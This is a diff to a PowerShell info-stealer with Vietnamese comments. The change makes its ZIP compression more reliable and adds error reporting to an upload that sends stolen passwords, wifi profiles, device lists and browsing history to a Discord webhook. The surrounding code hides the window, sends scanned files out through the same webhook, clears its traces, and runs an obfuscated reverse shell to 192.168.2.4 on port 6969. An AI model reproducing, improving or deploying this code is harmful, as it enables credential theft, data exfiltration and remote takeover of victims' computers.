@@ -35,12 +35,48 @@ while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt") -or !(Test-Path 
 
 Move-Item passwords.txt, wifi.txt, connected_devices.txt, history.txt -Destination "$dumpFolder"
 
-# Compress extracted data
-Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force
+# ============================================
+# NÉN DỮ LIỆU (ĐÃ SỬA LỖI)
+# ============================================
 
-# Wait until the ZIP file is created
-while (!(Test-Path "$dumpFile")) {
-    Start-Sleep -Milliseconds 100
+# Đợi file được ghi hoàn tất
+Start-Sleep -Seconds 2
+
+# Kiểm tra thư mục dump có file không
+$fileCount = (Get-ChildItem "$dumpFolder" -File -ErrorAction SilentlyContinue).Count
+Write-Output "Số file trong thư mục dump: $fileCount"
+
+if ($fileCount -eq 0) {
+    Write-Output "Không có file nào để nén! Thoát."
+    exit 1
+}
+
+# Xóa file zip cũ nếu tồn tại
+if (Test-Path "$dumpFile") {
+    Remove-Item "$dumpFile" -Force
+}
+
+# Nén bằng .NET (ổn định hơn Compress-Archive)
+try {
+    Add-Type -AssemblyName System.IO.Compression.FileSystem
+    $zip = [System.IO.Compression.ZipFile]::Open("$dumpFile", 'Create')
+    Get-ChildItem -Path "$dumpFolder" -Recurse | ForEach-Object {
+        $relativePath = $_.FullName.Substring($dumpFolder.Length + 1)
+        [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, $_.FullName, $relativePath)
+    }
+    $zip.Dispose()
+    Write-Output "Đã nén thành công: $dumpFile"
+} catch {
+    Write-Output "Lỗi nén: $_"
+    exit 1
+}
+
+# Kiểm tra file zip có được tạo không
+if ((Test-Path "$dumpFile") -and ((Get-Item "$dumpFile").Length -gt 0)) {
+    Write-Output "File zip đã được tạo, kích thước: $((Get-Item "$dumpFile").Length) bytes"
+} else {
+    Write-Output "File zip không được tạo hoặc bị rỗng!"
+    exit 1
 }
 
 # ============================================
@@ -54,7 +90,7 @@ if ($hookurl.Length -lt 120){
 }
 
 # ============================================
-# GỬI FILE ZIP QUA DISCORD (QUAN TRỌNG)
+# GỬI FILE ZIP QUA DISCORD
 # ============================================
 
 if (Test-Path "$dumpFile") {
@@ -74,11 +110,14 @@ $fileBase64
     
     try {
         Invoke-RestMethod -Uri $hookurl -Method Post -Body $multipartContent -Headers $headers -UseBasicParsing
-    } catch {}
+        Write-Output "Đã gửi file zip qua Discord thành công!"
+    } catch {
+        Write-Output "Lỗi gửi file zip: $_"
+    }
 }
 
 # ============================================
-# ẨN CỬA SỔ (CHO FINDSANDsend)
+# ẨN CỬA SỔ (CHO FINDSEND)
 # ============================================
 
 $hide = 'y'
@@ -97,7 +136,7 @@ if($hide -eq 'y'){
 }
 
 # ============================================
-# FINDSANDsend (QUÉT FILE VÀ GỬI QUA DISCORD)
+# FINDSEND (QUÉT FILE VÀ GỬI QUA DISCORD)
 # ============================================
 
 Function FindAndSend {
@@ -168,9 +207,13 @@ Remove-Item -Path $basePath -Recurse -Force
 Remove-MpPreference -ExclusionPath $basePath -Force
 
 # ============================================
-# REVERSE SHELL (THÊM VÀO CUỐI FILE)
+# REVERSE SHELL
 # ============================================
 
 $47f6eed18a29937a718172f3bab39b6d8b68f46cd46734d222793dfc51b39358='P'+'S ';$4782544cc93c0fb50e03cbf764a54693c8e3b075ca763f3fdbb9de95b1330e5c44bf5512335caa51442f1a159d8877ba179aa5268624d4200a1d170c893ad63c='1'+""+'9'+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+'2'+'.'+""+""+'1'+""+'6'+""+""+""+""+""+""+""+""+""+""+""+""+""+'8'+'.'+'2'+'.'+""+'4'+""+""+""+""+""+""+""+"";$948fe603f61dc036b5c596dc09fe3ce3f3d30dc90f024c85f3c82db2ccab679d = n''ew''-OB''je''CT system.net.sockets.tcpclient($4782544cc93c0fb50e03cbf764a54693c8e3b075ca763f3fdbb9de95b1330e5c44bf5512335caa51442f1a159d8877ba179aa5268624d4200a1d170c893ad63c,6969);$06060b1118e0150f82b45941e3eebe81daecaee17e7b6be173ce7bbf56e571d1 = $948fe603f61dc036b5c596dc09fe3ce3f3d30dc90f024c85f3c82db2ccab679d.GetStream();[byte[]]$bytes = 0..65535|%{0};sleep(0.1);sleep(0.1);sleep(0.1);sleep(0.1);while(($i = $06060b1118e0150f82b45941e3eebe81daecaee17e7b6be173ce7bbf56e571d1.Read($bytes, 0, $bytes.Length)) -ne 0){;$2df91d337f6f62021157bbfe1826d2fa61ce752dbea78160523fb1232ae0e773 = (n''Ew-oB''J''eC''t -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (i''e''x'' -Debug -Verbose -ErrorVariable $e -InformationAction Ignore -WarningAction Inquire $2df91d337f6f62021157bbfe1826d2fa61ce752dbea78160523fb1232ae0e773 2>&1 | O''U''t-S''TrI''n''G );$sendback2 = $sendback + $47f6eed18a29937a718172f3bab39b6d8b68f46cd46734d222793dfc51b39358.SubString(0,3) + (SP''L''iT-P''A''t''h -path "$(p''w''D'')\0x00") + '> ';sleep 0.01;sleep 0.01;$d3bc0f0a16698f7816456b52999306721831b002971b9f09c7fffa8c947ace7537618044e30ec4c0ecfedff2c5b481b8dfae1611b0649da555ca483d6d5af7fb = ([text.encoding]::ASCII).GetBytes($sendback2);sleep 0.01;$06060b1118e0150f82b45941e3eebe81daecaee17e7b6be173ce7bbf56e571d1.Write($d3bc0f0a16698f7816456b52999306721831b002971b9f09c7fffa8c947ace7537618044e30ec4c0ecfedff2c5b481b8dfae1611b0649da555ca483d6d5af7fb,0,$d3bc0f0a16698f7816456b52999306721831b002971b9f09c7fffa8c947ace7537618044e30ec4c0ecfedff2c5b481b8dfae1611b0649da555ca483d6d5af7fb.Length);sleep 0.01;$06060b1118e0150f82b45941e3eebe81daecaee17e7b6be173ce7bbf56e571d1.Flush()};sleep 0.01;$948fe603f61dc036b5c596dc09fe3ce3f3d30dc90f024c85f3c82db2ccab679d.Close()
+
+# ============================================
+# KẾT THÚC
+# ============================================
 
 Stop-Process -Id $PID -Force
